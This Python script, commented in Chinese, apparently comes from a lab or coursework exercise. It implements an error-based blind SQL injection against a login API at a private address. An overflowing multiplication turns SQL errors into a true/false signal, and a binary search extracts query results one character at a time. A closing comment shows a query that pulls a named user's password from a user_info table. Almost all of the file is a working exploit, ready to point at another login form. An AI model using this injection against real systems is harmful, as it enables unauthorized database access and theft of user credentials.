import requests
import tqdm

# 猜测服务器 SQL 语句：
# SELECT * FROM users WHERE username='' AND password=''
# 攻击构造：
# SELECT * FROM users WHERE username="2" + (ascii(substr(({}),{},1))<{})*1e200*1e200*1e200# AND password="22"
# 解释：
# substr(str, pos, len) 返回从 pos 开始的 len 个字符
# ascii(str) 返回 str 的 ASCII 码
# 所以 ascii(substr(query,index,1)) 返回的是 query 结果中第 index 个字符的 ASCII 码
# 通过比较字符可以将结果转换为布尔，后面乘大整数时
# 如果前面是 0，则会正常返回 “Username or password is incorrect”
# 如果前面是 1，则会由于超出范围而触发SQL错误，返回 “Cannot read data!”

# 盲注基本参数
payload_template = '2" + (ascii(substr(({}),{},1))<{})*1e200*1e200*1e200#'
login_url = "http://192.168.2.2/api/account/login.php"

# 利用 requests 包模拟提交请求
def login(username, password):
    return requests.post(login_url, {
        "username": username,
        "password": password
    })
    
# 判断是否猜测正确
def test(payload):
    res = login(payload, "22").json()
    return res["msg"] == 'Cannot read data!'
    
# 利用二分查找加快判断过程
def leak_char(query, index):
    left, right = 0, 255
    while left < right - 1:
        mid = (left + right) // 2
        payload = payload_template.format(query, index, mid)
        if test(payload):
            right = mid
        else:
            left = mid
    return left

if __name__ == '__main__':
    # 从命令行读取命令
    query = input("Enter query: ")
    idx = 1
    result = ""
    while True:
        char = leak_char(query, idx)
        if char == 0:
            break
        result += chr(char)
        idx += 1
    print("Result:")
    print(result)

# select password from user_info where username='zhangq22'